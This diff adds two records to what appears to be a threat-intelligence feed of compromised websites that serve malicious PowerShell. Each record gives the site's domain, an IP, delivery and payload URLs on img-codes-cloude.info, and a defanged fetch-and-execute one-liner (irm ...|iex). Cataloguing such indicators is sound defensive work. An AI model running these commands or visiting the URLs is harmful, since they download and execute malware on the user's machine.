@@ -1,1 +1,58 @@
-[]
+[
+  {
+    "UrlDomain": "cursosesferaquantica.com.br",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.58"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/2a045945bf71a565",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e10ef8de19605c32100e813253d3d24e5d4bc2d679abf1a5&amp;_v=29921786",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e10ef8de1",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e10ef8de19605c32100e813253d3d24e5d4bc2d679abf1a5&_v=29921786",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/2a045945bf71a565'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/2a045945bf71a565"
+    ],
+    "ReportId": "cmwr3jq8o2aa40oml2lcavt5m",
+    "ScannedAt": "2026-11-22T00:26:30.760000+00:00"
+  },
+  {
+    "UrlDomain": "www.prenursingsmarter.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "35.227.26.162"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/8db6c20bbab6276e",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/8db6c20bbab6276e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/8db6c20bbab6276e"
+    ],
+    "ReportId": "cmwr2ypwb29gj0omlf48po5rs",
+    "ScannedAt": "2026-11-22T00:10:10.523000+00:00"
+  }
+]
